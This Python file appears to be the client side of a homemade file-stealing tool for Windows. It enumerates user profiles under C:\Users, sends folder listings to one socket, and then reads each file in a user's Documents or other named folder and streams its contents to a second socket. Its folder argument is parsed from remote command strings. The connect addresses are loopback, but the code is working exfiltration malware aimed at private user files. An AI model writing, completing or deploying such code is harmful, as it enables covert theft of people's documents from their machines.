import os
from os import path, listdir
from os.path import isfile
from glob import glob
import socket
from pickle import dumps
import threading
import time
CONN_HOST = "127.0.0.2"
CONN_PORT = 65433 
folder = ""
sep = ":***:"

def getuser(): # Get all users from C:\Users\
    return [path.basename(x) for x in glob('C:\\Users\\*') if x not in ['C:\\Users\\Public', 'C:\\Users\\All Users', 'C:\\Users\\Default', 'C:\\Users\\Default User', 'C:\\Users\\desktop.ini']]

def getfiles(scan_user: str, dict_files: str):
    return [path.basename(x) for x in glob('C:\\Users\\'+scan_user+'\\'+dict_files+'\\*') if '.lnk' not in x]


# Created threads for each function cuz CLI wouldnt work without it
def start_FolderData(fol: str):
        FolderThread = threading.Thread(target=lambda: sendFolderData(fol))
        FolderThread.daemon = True
        FolderThread.start()
        FolderThread.join()

def start_sendFiles(filedir: str):
        FileThread = threading.Thread(target=lambda: sendFiles(filedir))
        FileThread.daemon = True
        FileThread.start()
        FileThread.join()


def sendFolderData(fol: str):
    global folder
    users = getuser()
    try:
        #! This should seperate the folder name from the command
        folder = fol.split('-')[2]
        local_files = getfiles(users[1], f"{folder}")
    except:
        try:
            local_files = getfiles(users[1], "Documents")
        except:
            local_files = getfiles(users[0], "Dokumenty")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as suck:
        suck.connect((CONN_HOST, CONN_PORT))
        print("File transfer socket connected.")
        suck.send(dumps(users))
        suck.send(dumps(local_files)) # Server have to use loads(data) from pickle library
    suck.close()
    print("Closed Folder Transfer socket.")



def sendFiles(filedir: str):
    print("SEND_FILES: started function")
    CONNF_HOST = "127.0.0.4"
    CONNF_PORT = 1930
    try:
        filedir = filedir.split('-')[2]
        print(f"Got {filedir}")
    except:
        filedir = "Documents"

    full_path =  "C:\\Users\\" + getuser()[0] + "\\" + filedir
    print(full_path)
    
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as suck:
        suck.connect((CONNF_HOST, CONNF_PORT))
        print("Connected socket")
        # First send the amount of times the action will execute
        msg = str(len(listdir(full_path)))
        suck.send(msg.encode("utf-8"))
        while True:
            msg = suck.recv(1024).decode("utf-8")
            if msg == "FILE_count_recv": break

        bannedtypes = [".lnk", ".rdp", ".ini",".jpg",".png",".webp",".gif",".mp4",".docx", ".crdownload"]
        for filename in listdir(full_path): # Get each file in folder
            if isfile("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename) and not filename.endswith(tuple(bannedtypes)):
                data = f"{filename}"
                suck.send(data.encode("utf-8"))
                msg = suck.recv(1024).decode("utf-8")
                print(f"SERVER: {msg}")

                filepath = full_path + "\\"+filename
                with open(filepath, "r") as f:
                    while True:
                        data = f.read(1024)
            
                        if not data:
                            suck.send("END".encode("utf-8"))
                            print("END")
                            break
            
                        suck.send(data.encode("utf-8"))
                        msg = suck.recv(1024).decode("utf-8")
                print("Ended")
            